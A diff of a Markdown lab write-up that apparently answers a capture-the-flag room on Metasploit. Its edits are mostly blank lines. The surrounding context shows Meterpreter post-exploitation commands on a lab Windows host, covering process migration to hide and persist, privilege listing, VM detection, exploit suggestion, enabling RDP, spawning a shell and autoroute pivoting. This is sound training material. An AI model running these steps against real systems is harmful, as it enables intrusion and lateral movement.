@@ -137,7 +137,6 @@ msf6 > db_status
     - `hosts`
     - `services`
     - `vulns`
--
 
 ### What service does nmap identify running on port 135?
 - **Answer:** msrpc
@@ -228,6 +227,7 @@ meterpreter > migrate 1372
 [-] Error running command migrate: Rex::RuntimeError Cannot migrate into this process (insufficient privileges)
 ``` 
 - Reasons for migration
+
 ```
 - Hiding the process to gain persistence and avoid detection.
 - Change the process architecture to execute some payloads with the corrent architecture. For example, if there is a 64-bits system and our meterpreter process is 86-bits, some architecture-related problems could happen if we try to execute some exploits against the session gained.
@@ -272,6 +272,7 @@ Meterpreter     : x86/windows
 - **Answer:** getprivs
 - **Steps to Reproduce:** 
     - Run `help` command.
+
 ```ps
 meterpreter > getprivs
 
@@ -305,7 +306,8 @@ SeUndockPrivilege
 ---
 
 ### Running post modules
-- To determine if we are in a VM
+- To determine if we are in a VM.
+
 ```ps
 meterpreter > run post/windows/gather/checkvm
 
@@ -314,6 +316,7 @@ meterpreter > run post/windows/gather/checkvm
 ```
 
 - To check for various exploit for privilege escalation.
+
 ```ps
 meterpreter > run post/multi/recon/local_exploit_suggester
 
@@ -332,6 +335,7 @@ nil versions are discouraged and will be deprecated in Rubygems 4
 ```
 
 - To try forcing RDP to be available. (In this machine, we don't have the privileges yet.)
+
 ```ps
 meterpreter > run post/windows/manage/enable_rdp
 
@@ -341,7 +345,8 @@ meterpreter > run post/windows/manage/enable_rdp
 
 ### One quick extra question, what command can we run in our meterpreter session to spawn a normal system shell? 
 - **Answer:** shell
-- **Steps to Reproduce:** 
+- **Steps to Reproduce:**
+
 ```ps
 meterpreter > shell
 Process 2232 created.
@@ -360,6 +365,7 @@ C:\Program Files (x86)\Icecast2 Win32>
 - **Answer:** run autoroute -s 172.18.1.0 -n 255.255.255.0
 - **Steps to Reproduce:** 
 - Subnet mask of `/24` -> 255.255.255.0
+
 ```ps
 meterpreter > run autoroute -h
 
@@ -399,6 +405,7 @@ Active Routing Table
 - **Answer:** auxiliary/server/socks5
 - **Steps to Reproduce:** 
     - Updates in latest version of msfconsole
+
 ```ps
 msf6 exploit(windows/http/icecast_header) > search socks5
 [-] No results from search
